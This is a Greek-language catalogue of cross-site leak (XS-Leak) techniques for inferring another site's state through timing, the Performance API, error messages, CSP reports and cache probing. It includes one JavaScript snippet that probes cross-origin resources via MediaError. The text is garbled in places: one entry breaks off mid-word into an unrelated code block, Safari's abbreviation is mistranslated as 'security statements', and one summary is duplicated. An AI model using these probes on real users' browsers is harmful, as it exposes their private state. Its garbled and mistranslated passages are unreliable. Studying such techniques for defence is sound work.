- **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Summary:** Ένας επιτιθέμενος θα μπορούσε να κλειδώσει όλες τις υποδοχές εκτός από 1, να φορτώσει τον στοχευμένο ιστό και ταυτόχρονα να φορτώσει μια άλλη σελίδα, ο χρόνος μέχρι να αρχίσει να φορτώνει η τελευταία σελίδα είναι ο χρόνος που χρειάστηκε η στοχευμένη σελίδα για να φορτώσει.
- **Code Example**:

{{#ref}}
xs-search/connection-pool-example.md
{{#endref}}

Οι περιηγητές χρησιμοποιούν υποδοχές για την επικοινωνία με τον διακομιστή, αλλά λόγω των περιορισμένων πόρων του λειτουργικού συστήματος και του υλικού, **οι περιηγητές υποχρεούνται να επιβάλλουν ένα όριο** στον αριθμό των ταυτόχρονων υποδοχών. Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν αυτόν τον περιορισμό μέσω των εξής βημάτων:

1. Προσδιορίστε το όριο υποδοχών του περιηγητή, για παράδειγμα, 256 παγκόσμιες υποδοχές.
2. Καταλάβετε 255 υποδοχές για παρατεταμένη διάρκεια ξεκινώντας 255 αιτήματα σε διάφορους διακομιστές, σχεδιασμένα να κρατούν τις συνδέσεις ανοιχτές χωρίς να ολοκληρώνονται.
3. Χρησιμοποιήστε την 256η υποδοχή για να στείλετε ένα αίτημα στη στοχευμένη σελίδα.
4. Προσπαθήστε να κάνετε ένα 257ο αίτημα σε διαφορετικό διακομιστή. Δεδομένου ότι όλες οι υποδοχές είναι σε χρήση (σύμφωνα με τα βήματα 2 και 3), αυτό το αίτημα θα είναι σε αναμονή μέχρι να γίνει διαθέσιμη μια υποδοχή. Η καθυστέρηση πριν προχωρήσει αυτό το αίτημα παρέχει στον επιτιθέμενο πληροφορίες χρονισμού σχετικά με τη δικτυακή δραστηριότητα που σχετίζεται με την 256η υποδοχή (την υποδοχή της στοχευμένης σελίδας). Αυτή η συμπερασματική είναι δυνατή επειδή οι 255 υποδοχές από το βήμα 2 είναι ακόμα απασχολημένες, υποδηλώνοντας ότι οποιαδήποτε νέα διαθέσιμη υποδοχή πρέπει να είναι αυτή που απελευθερώθηκε από το βήμα 3. Ο χρόνος που χρειάζεται για να γίνει διαθέσιμη η 256η υποδοχή συνδέεται άμεσα με τον χρόνο που απαιτείται για να ολοκληρωθεί το αίτημα στη στοχευμένη σελίδα.

Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**:
- **Summary:** Είναι όπως η προηγούμενη τεχνική αλλά αντί να χρησιμοποιεί όλες τις υποδοχές, το Google **Chrome** θέτει ένα όριο **6 ταυτόχρονων αιτημάτων στην ίδια προέλευση**. Αν **μπλοκάρουμε 5** και στη συνέχεια **εκκινήσουμε ένα 6ο** αίτημα μπορούμε να **χρονίσουμε** το και αν καταφέραμε να κάνουμε τη **σελίδα θύμα να στείλει** περισσότερα **αιτήματα** στο ίδιο endpoint για να ανιχνεύσουμε μια **κατάσταση** της **σελίδας**, το **6ο αίτημα** θα χρειαστεί **περισσότερο** χρόνο και μπορούμε να το ανιχνεύσουμε.

## Performance API Techniques

Το [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) προσφέρει πληροφορίες σχετικά με τις μετρικές απόδοσης των διαδικτυακών εφαρμογών, περαιτέρω εμπλουτισμένο από το [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Το Resource Timing API επιτρέπει την παρακολούθηση λεπτομερών χρονισμών αιτημάτων δικτύου, όπως η διάρκεια των αιτημάτων. Σημαντικά, όταν οι διακομιστές περιλαμβάνουν την επικεφαλίδα `Timing-Allow-Origin: *` στις απαντήσεις τους, επιπλέον δεδομένα όπως το μέγεθος μεταφοράς και ο χρόνος αναζήτησης τομέα γίνονται διαθέσιμα.

Αυτή η πλούσια συλλογή δεδομένων μπορεί να ανακτηθεί μέσω μεθόδων όπως [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ή [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), παρέχοντας μια ολοκληρωμένη εικόνα των πληροφοριών που σχετίζονται με την απόδοση. Επιπλέον, το API διευκολύνει τη μέτρηση των χρόνων εκτέλεσης υπολογίζοντας τη διαφορά μεταξύ των χρονικών σημείων που αποκτώνται από [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Ωστόσο, αξίζει να σημειωθεί ότι για ορισμένες λειτουργίες σε περιηγητές όπως το Chrome, η ακρίβεια του `performance.now()` μπορεί να περιορίζεται σε χιλιοστά του δευτερολέπτου, γεγονός που μπορεί να επηρεάσει την λεπτομέρεια των μετρήσεων χρονισμού.

Πέρα από τις μετρήσεις χρονισμού, το Performance API μπορεί να αξιοποιηθεί για πληροφορίες σχετικές με την ασφάλεια. Για παράδειγμα, η παρουσία ή η απουσία σελίδων στο αντικείμενο `performance` στο Chrome μπορεί να υποδηλώνει την εφαρμογή του `X-Frame-Options`. Συγκεκριμένα, αν μια σελίδα αποκλείεται από την απόδοση σε ένα πλαίσιο λόγω του `X-Frame-Options`, δεν θα καταγραφεί στο αντικείμενο `performance`, παρέχοντας μια λεπτή ένδειξη σχετικά με τις πολιτικές πλαισίωσης της σελίδας.

### Error Leak

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Κωδικός Κατάστασης
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Ένα αίτημα που έχει ως αποτέλεσμα σφάλματα δεν θα δημιουργήσει μια είσοδο χρονισμού πόρου.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Είναι δυνατόν να **διακρίνετε μεταξύ των κωδικών κατάστασης HTTP** επειδή τα αιτήματα που οδηγούν σε **σφάλμα** δεν **δημιουργούν μια είσοδο απόδοσης**.

### Style Reload Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Κωδικός Κατάστασης
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Λόγω ενός σφάλματος του περιηγητή, τα αιτήματα που έχουν ως αποτέλεσμα σφάλματα φορτώνονται δύο φορές.
- **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Στην προηγούμενη τεχνική εντοπίστηκαν επίσης δύο περιπτώσεις όπου σφάλματα του περιηγητή στο GC οδηγούν σε **πόρους που φορτώνονται δύο φορές όταν αποτυγχάνουν να φορτωθούν**. Αυτό θα έχει ως αποτέλεσμα πολλαπλές εισόδους στο Performance API και μπορεί έτσι να ανιχνευθεί.

### Request Merging Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Κωδικός Κατάστασης
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Τα αιτήματα που έχουν ως αποτέλεσμα σφάλμα δεν μπορούν να συγχωνευθούν.
- **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Η τεχνική βρέθηκε σε έναν πίνακα στο αναφερόμενο έγγραφο αλλά δεν βρέθηκε περιγραφή της τεχνικής σε αυτό. Ωστόσο, μπορείτε να βρείτε τον πηγαίο κώδικα ελέγχοντας το [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Οι κενές απαντήσεις δεν δημιουργούν εισόδους χρονισμού πόρου.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Ένας επιτιθέμενος μπορεί να ανιχνεύσει αν ένα αίτημα είχε ως αποτέλεσμα ένα κενό σώμα HTTP επειδή οι **κενές σελίδες δεν δημιουργούν μια είσοδο απόδοσης σε ορισμένους περιηγητές**.

### **XSS-Auditor Leak**

- **Inclusion Methods**: Frames
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Χρησιμοποιώντας τον XSS Auditor στις Ασφαλιστικές Δηλώσεις, οι επιτιθέμενοι μπορούν να ανιχνεύσουν συγκεκριμένα στοιχεία ιστοσελίδας παρατηρώντας τις αλλαγές στις απαντήσεις όταν οι κατασκευασμένες payloads ενεργοποιούν τον μηχανισμό φιλτραρίσματος του auditor.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Στις Ασφαλιστικές Δηλώσεις (SA), ο XSS Auditor, αρχικά προορισμένος να αποτρέπει επιθέσεις Cross-Site Scripting (XSS), μπορεί παραδόξως να εκμεταλλευτεί για να διαρρεύσει ευαίσθητες πληροφορίες. Αν και αυτή η ενσωματωμένη λειτουργία αφαιρέθηκε από το Google Chrome (GC), είναι ακόμα παρούσα στο SA. Το 2013, οι Braun και Heiderich απέδειξαν ότι ο XSS Auditor θα μπορούσε ακούσια να αποκλείσει νόμιμα σενάρια, οδηγώντας σε ψευδώς θετικά. Βασισμένοι σε αυτό, οι ερευνητές ανέπτυξαν τεχνικές για την εξαγωγή πληροφοριών και την ανίχνευση συγκεκριμένου περιεχομένου σε διασυνοριακές σελίδες, μια έννοια γνωστή ως XS-Leaks, που αναφέρθηκε αρχικά από τον Terada και αναλύθηκε από τον Heyes σε μια ανάρτηση ιστολογίου. Αν και αυτές οι τεχνικές ήταν συγκεκριμένες για τον XSS Auditor στο GC, ανακαλύφθηκε ότι στο SA, οι σελίδες που αποκλείονται από τον XSS Auditor δεν δημιουργούν εισόδους στο Performance API, αποκαλύπτοντας μια μέθοδο μέσω της οποίας μπορεί να διαρρεύσει ευαίσθητες πληροφορίες.

### X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Επικεφαλίδα
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Summary:** Πόρος με επικεφαλίδα X-Frame-Options δεν δημιουργεί είσοδο χρονισμού πόρου.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Αν μια σελίδα **δεν επιτρέπεται** να **αποδοθεί** σε ένα **iframe** δεν δημιουργεί **είσοδο απόδοσης**. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να ανιχνεύσει την επικεφαλίδα απάντησης **`X-Frame-Options`**.\
Το ίδιο συμβαίνει αν χρησιμοποιήσετε μια **embed** **ετικέτα.**

### Download Detection

- **Inclusion Methods**: Frames
- **Detectable Difference**: Επικεφαλίδα
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Οι λήψεις δεν δημιουργούν εισόδους χρονισμού πόρων στο Performance API.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Παρόμοια, με την διαρροή XS που περιγράφηκε, ένας **πόρος που κατεβάζεται** λόγω της επικεφαλίδας ContentDisposition, επίσης δεν **δημιουργεί μια είσοδο απόδοσης**. Αυτή η τεχνική λειτουργεί σε όλους τους κύριους περιηγητές.

### Redirect Start Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Ανακατεύθυνση
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Η είσοδος χρονισμού πόρου διαρρέει τον χρόνο έναρξης μιας ανακατεύθυνσης.
- **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Βρήκαμε μια περίπτωση XS-Leak που εκμεταλλεύεται τη συμπεριφορά ορισμένων περιηγητών που καταγράφουν υπερβολικές πληροφορίες για διασυνοριακά αιτήματα. Το πρότυπο ορίζει ένα υποσύνολο χαρακτηριστικών που θα πρέπει να οριστούν σε μηδέν για διασυνοριακούς πόρους. Ωστόσο, στο **SA** είναι δυνατόν να ανιχνευθεί αν ο χρήστης **ανακατευθύνεται** από τη στοχευμένη σελίδα, ερωτώντας το **Performance API** και ελέγχοντας τα δεδομένα χρονισμού **redirectStart**.

### Duration Redirect Leak

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Ανακατεύθυνση
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Η διάρκεια των εισόδων χρονισμού είναι αρνητική όταν συμβαίνει μια ανακατεύθυνση.
- **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Στο GC, η **διάρκεια** για αιτήματα που έχουν ως αποτέλεσμα μια **ανακατεύθυνση** είναι **αρνητική** και μπορεί έτσι να **διακριθεί** από αιτήματα που δεν έχουν ως αποτέλεσμα ανακατεύθυνση.

### CORP Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Επικεφαλίδα
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Πόρος προστατευμένος με CORP δεν δημιουργεί εισόδους χρονισμού πόρων.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Σε ορισμένες περιπτώσεις, η **είσοδος nextHopProtocol** μπορεί να χρησιμοποιηθεί ως τεχνική διαρροής. Στο GC, όταν η **επικεφαλίδα CORP** είναι ρυθμισμένη, το nextHopProtocol θα είναι **κενό**. Σημειώστε ότι το SA δεν θα δημιουργήσει καθόλου μια είσοδο απόδοσης για πόρους που έχουν ενεργοποιηθεί με CORP.

### Service Worker

- **Inclusion Methods**: Frames
- **Detectable Difference**: Χρήση API
- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Summary:** Ανίχνευση αν ένας service worker είναι καταχωρημένος για μια συγκεκριμένη προέλευση.
- **Code Example**:

Οι service workers είναι σενάρια που εκτελούνται σε ένα προορισμό. Εκτελούνται στο παρασκήνιο μιας ιστοσελίδας και μπορούν να παρεμβαίνουν, να τροποποιούν και να **κάνουν cache πόρους** για να δημιουργήσουν offline διαδικτυακές εφαρμογές.\
Αν ένας **πόρος που έχει γίνει cache** από έναν **service worker** προσπελαστεί μέσω **iframe**, ο πόρος θα **φορτωθεί από την cache του service worker**.\
Για να ανιχνεύσετε αν ο πόρος **φορτώθηκε από την cache του service worker**, μπορεί να χρησιμοποιηθεί το **Performance API**.\
Αυτό θα μπορούσε επίσης να γίνει με μια επίθεση χρονισμού (ελέγξτε το έγγραφο για περισσότερες πληροφορίες).

### Cache

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Χρονισμός
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Summary:** Είναι δυνατόν να ελέγξετε αν ένας πόρος αποθηκεύτηκε στην cache.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

Χρησιμοποιώντας το [Performance API](xs-search.md#performance-api) είναι δυνατόν να ελέγξετε αν ένας πόρος είναι cached.

### Network Duration

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Περι
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
Η ιδιότητα message της διεπαφής `MediaError` προσδιορίζει μοναδικά τους πόρους που φορτώνονται επιτυχώς με μια διακριτή συμβολοσειρά. Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτή τη δυνατότητα παρατηρώντας το περιεχόμενο του μηνύματος, deducing έτσι την κατάσταση απόκρισης ενός πόρου διασυνοριακής προέλευσης.

### CORS Error

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Περίληψη:** Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS εκθέτουν ακούσια το πλήρες URL των ανακατευθυνόμενων αιτημάτων.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Αυτή η τεχνική επιτρέπει σε έναν επιτιθέμενο να **εξάγει τον προορισμό μιας ανακατεύθυνσης ιστότοπου διασυνοριακής προέλευσης** εκμεταλλευόμενος το πώς οι περιηγητές που βασίζονται σε Webkit χειρίζονται τα αιτήματα CORS. Συγκεκριμένα, όταν ένα **CORS-enabled request** αποστέλλεται σε έναν στόχο που εκδίδει μια ανακατεύθυνση με βάση την κατάσταση του χρήστη και ο περιηγητής στη συνέχεια απορρίπτει το αίτημα, το **πλήρες URL του στόχου της ανακατεύθυνσης** αποκαλύπτεται μέσα στο μήνυμα σφάλματος. Αυτή η ευπάθεια αποκαλύπτει όχι μόνο το γεγονός της ανακατεύθυνσης αλλά και το σημείο ανακατεύθυνσης και οποιαδήποτε **ευαίσθητα παραμέτρους ερωτήματος** μπορεί να περιέχει.

### SRI Error

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Περίληψη:** Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS εκθέτουν ακούσια το πλήρες URL των ανακατευθυνόμενων αιτημάτων.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί **λεπτομερή μηνύματα σφάλματος** για να deduce το μέγεθος των αποκρίσεων διασυνοριακής προέλευσης. Αυτό είναι δυνατό λόγω του μηχανισμού της Ακεραιότητας Υποπόρων (SRI), ο οποίος χρησιμοποιεί την ιδιότητα ακεραιότητας για να επαληθεύσει ότι οι πόροι που ανακτώνται, συχνά από CDNs, δεν έχουν παραποιηθεί. Για να λειτουργήσει το SRI σε πόρους διασυνοριακής προέλευσης, αυτοί πρέπει να είναι **CORS-enabled**; αλλιώς, δεν υπόκεινται σε ελέγχους ακεραιότητας. Στις Δηλώσεις Ασφαλείας (SA), παρόμοια με το σφάλμα CORS XS-Leak, ένα μήνυμα σφάλματος μπορεί να καταγραφεί μετά από ένα αίτημα fetch με μια ιδιότητα ακεραιότητας που αποτυγχάνει. Οι επιτιθέμενοι μπορούν σκόπιμα να **προκαλέσουν αυτό το σφάλμα** αναθέτοντας μια **ψευδή τιμή hash** στην ιδιότητα ακεραιότητας οποιουδήποτε αιτήματος. Στην SA, το προκύπτον μήνυμα σφάλματος αποκαλύπτει ακούσια το μήκος περιεχομένου του ζητούμενου πόρου. Αυτή η διαρροή πληροφοριών επιτρέπει σε έναν επιτιθέμενο να διακρίνει παραλλαγές στο μέγεθος της απόκρισης, ανοίγοντας το δρόμο για εξελιγμένες επιθέσεις XS-Leak.

### CSP Violation/Detection

- **Μέθοδοι Συμπερίληψης**: Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Περίληψη:** Επιτρέποντας μόνο τον ιστότοπο των θυμάτων στο CSP, αν προσπαθήσουμε να ανακατευθύνουμε σε διαφορετικό τομέα, το CSP θα προκαλέσει ένα ανιχνεύσιμο σφάλμα.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Ένα XS-Leak μπορεί να χρησιμοποιήσει το CSP για να ανιχνεύσει αν ένας ιστότοπος διασυνοριακής προέλευσης ανακατευθύνθηκε σε διαφορετική προέλευση. Αυτή η διαρροή μπορεί να ανιχνεύσει την ανακατεύθυνση, αλλά επιπλέον, ο τομέας του στόχου της ανακατεύθυνσης διαρρέει. Η βασική ιδέα αυτής της επίθεσης είναι να **επιτρέψει τον τομέα στόχο στον ιστότοπο του επιτιθέμενου**. Μόλις εκδοθεί ένα αίτημα στον τομέα στόχο, αυτό **ανακατευθύνει** σε έναν τομέα διασυνοριακής προέλευσης. **Το CSP μπλοκάρει** την πρόσβαση σε αυτό και δημιουργεί μια **αναφορά παραβίασης που χρησιμοποιείται ως τεχνική διαρροής**. Ανάλογα με τον περιηγητή, **αυτή η αναφορά μπορεί να διαρρεύσει την τοποθεσία στόχου της ανακατεύθυνσης**.\
Οι σύγχρονοι περιηγητές δεν θα υποδείξουν το URL στο οποίο ανακατευθύνθηκε, αλλά μπορείτε ακόμα να ανιχνεύσετε ότι μια ανακατεύθυνση διασυνοριακής προέλευσης προκλήθηκε.

### Cache

- **Μέθοδοι Συμπερίληψης**: Frames, Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Περίληψη:** Καθαρίστε το αρχείο από την κρυφή μνήμη. Ανοίγει τη στοχευμένη σελίδα και ελέγχει αν το αρχείο είναι παρόν στην κρυφή μνήμη.
- **Παράδειγμα Κώδικα:**

Οι περιηγητές μπορεί να χρησιμοποιούν μια κοινή κρυφή μνήμη για όλες τις ιστοσελίδες. Ανεξάρτητα από την προέλευση τους, είναι δυνατό να deduce αν μια στοχευμένη σελίδα έχει **ζητήσει ένα συγκεκριμένο αρχείο**.

Αν μια σελίδα φορτώνει μια εικόνα μόνο αν ο χρήστης είναι συνδεδεμένος, μπορείτε να **ακυρώσετε** τον **πόρο** (έτσι ώστε να μην είναι πλέον αποθηκευμένος στην κρυφή μνήμη αν ήταν, δείτε περισσότερες πληροφορίες), **να εκτελέσετε ένα αίτημα** που θα μπορούσε να φορτώσει αυτόν τον πόρο και να προσπαθήσετε να φορτώσετε τον πόρο **με μια κακή αίτηση** (π.χ. χρησιμοποιώντας έναν υπερβολικά μεγάλο header referer). Αν η φόρτωση του πόρου **δεν προκάλεσε κανένα σφάλμα**, είναι επειδή ήταν **αποθηκευμένος στην κρυφή μνήμη**.

### CSP Directive

- **Μέθοδοι Συμπερίληψης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Περίληψη:** Οι κατευθυντήριες γραμμές CSP header μπορούν να ερευνηθούν χρησιμοποιώντας την ιδιότητα iframe CSP, αποκαλύπτοντας λεπτομέρειες πολιτικής.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Μια νέα δυνατότητα στο Google Chrome (GC) επιτρέπει στις ιστοσελίδες να **προτείνουν μια Πολιτική Ασφαλείας Περιεχομένου (CSP)** ορίζοντας μια ιδιότητα σε ένα στοιχείο iframe, με τις κατευθυντήριες γραμμές πολιτικής να μεταδίδονται μαζί με το HTTP αίτημα. Κανονικά, το ενσωματωμένο περιεχόμενο πρέπει να **εξουσιοδοτήσει αυτό μέσω ενός HTTP header**, ή να **εμφανιστεί μια σελίδα σφάλματος**. Ωστόσο, αν το iframe διέπεται ήδη από μια CSP και η νέα προτεινόμενη πολιτική δεν είναι πιο περιοριστική, η σελίδα θα φορτωθεί κανονικά. Αυτός ο μηχανισμός ανοίγει ένα μονοπάτι για έναν επιτιθέμενο να **ανιχνεύσει συγκεκριμένες κατευθυντήριες γραμμές CSP** μιας σελίδας διασυνοριακής προέλευσης αναγνωρίζοντας τη σελίδα σφάλματος. Αν και αυτή η ευπάθεια σημειώθηκε ως διορθωμένη, τα ευρήματά μας αποκαλύπτουν μια **νέα τεχνική διαρροής** ικανή να ανιχνεύσει τη σελίδα σφάλματος, υποδεικνύοντας ότι το υποκείμενο πρόβλημα δεν είχε ποτέ πλήρως αντιμετωπιστεί.

### **CORP**

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Περίληψη:** Οι πόροι που ασφαλίζονται με την Πολιτική Πόρων Διασυνοριακής Προέλευσης (CORP) θα προκαλέσουν σφάλμα όταν ανακτηθούν από μια μη επιτρεπόμενη προέλευση.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

Η κεφαλίδα CORP είναι μια σχετικά νέα δυνατότητα ασφάλειας της διαδικτυακής πλατφόρμας που όταν ρυθμιστεί **μπλοκάρει τις αιτήσεις διασυνοριακής προέλευσης χωρίς CORS για τον δεδομένο πόρο**. Η παρουσία της κεφαλίδας μπορεί να ανιχνευθεί, επειδή ένας πόρος που προστατεύεται με CORP θα **ρίξει ένα σφάλμα όταν ανακτηθεί**.

### CORB

- **Μέθοδοι Συμπερίληψης**: HTML Elements
- **Ανιχνεύσιμη Διαφορά**: Headers
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Περίληψη**: Το CORB μπορεί να επιτρέψει στους επιτιθέμενους να ανιχνεύσουν πότε η **κεφαλίδα `nosniff` είναι παρούσα** στο αίτημα.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Ελέγξτε το σύνδεσμο για περισσότερες πληροφορίες σχετικά με την επίθεση.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Headers
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
